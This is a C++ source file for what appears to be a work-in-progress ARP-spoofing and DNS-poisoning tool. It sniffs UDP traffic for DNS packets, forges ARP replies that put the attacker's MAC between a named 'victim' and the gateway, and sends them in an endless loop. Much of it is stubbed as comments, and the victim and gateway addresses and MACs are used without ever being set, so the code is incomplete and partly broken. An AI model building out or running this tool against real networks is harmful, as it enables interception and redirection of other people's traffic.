#include <iostream>
#include <unordered_map>
#include <vector>

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "NetworkEngine.h"
#include "UdpStack.h"

#include "dns.h"

void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet);

// get the interface name, ip of gateway and ip of victim
// main program we need: interface name, ip of gateway, ip of victim
// dns poison we need: domain to poison, what to poison too
int main(int argc, const char *argv[]) {
    const char *interfaceName = "wlp59s0";                        // get this from config file
    std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file

    unsigned char attackerMac[ETH_ALEN] = {0x01, 0x02, 0x03,
                                           0x04, 0x05, 0x06}; // get this from config file
    unsigned char victimMac[ETH_ALEN];                        // get this from arp request
    unsigned char gatewayMac[ETH_ALEN];                       // get this from arp request

    struct in_addr victimIp;
    struct in_addr gatewayIp;
    struct arp_header victimArp;
    struct arp_header gatewayArp;

    NetworkEngine ipEngine(interfaceName);

    // start arp sniffing

    // send arp request to get mac address of victim

    // send arp request to get the mac address of gateway

    // stop arp sniffing once victim and gateway macs are acquired

    // start dns sniffing
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            struct iphdr *ip;
            struct udphdr *udp;
            dnshdr *dns;

            int ipLen = 0;
            int udpLen = 0;
            int dnsLen = 0;

            // get ip hdr size
            ip = (iphdr *)(packet + 14);
            ipLen = ip->ihl * 4;

            // check to see if it is udp
            if (ip->protocol != IPPROTO_UDP) {
                return;
            }

            // get udp hdr and size
            udp = (udphdr *)(packet + 14 + ipLen);
            udpLen = UdpStack::UDP_HDR_LEN;

            // check that it is a dns packet
            if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
                return;
            }
        });
    ipEngine.startSniff(NetworkEngine::IP_FILTER);

    // start arp poisoning
    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    while (true) {
        ipEngine.sendArp(victimArp);
        ipEngine.sendArp(gatewayArp);
    }

    return 0;
}

/*
 * Simple callback that just displays some basic arp fields as a proof-of-concept
 */
void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet) {
    int i;
    struct arp_header *arpheader = NULL;
    arpheader = (struct arp_header *)(packet + 14);

    printf("\n\nReceived Packet Size: %d bytes\n", header->len);
    printf("Hardware type: %s\n", (ntohs(arpheader->arp_hd) == 1) ? "Ethernet" : "Unknown");
    printf("Protocol type: %s\n", (ntohs(arpheader->arp_pr) == ETH_P_IP) ? "IPv4" : "Unknown");
    printf("Operation: %s\n",
           (ntohs(arpheader->arp_op) == ARPOP_REPLY) ? "ARP Reply" : "ARP Request");

    /* If is Ethernet and IPv4, print packet contents */
    if (ntohs(arpheader->arp_hd) == ARPHRD_ETHER && ntohs(arpheader->arp_pr) == ETH_P_IP) {
        printf("Sender MAC: ");

        for (i = 0; i < 6; i++)
            printf("%02X:", arpheader->arp_sha[i]);

        printf("\nSender IP: ");

        for (i = 0; i < 4; i++)
            printf("%d.", arpheader->arp_spa[i]);

        printf("\nTarget MAC: ");

        for (i = 0; i < 6; i++)
            printf("%02X:", arpheader->arp_dha[i]);

        printf("\nTarget IP: ");

        for (i = 0; i < 4; i++)
            printf("%d.", arpheader->arp_dpa[i]);

        printf("\n");
    }
}
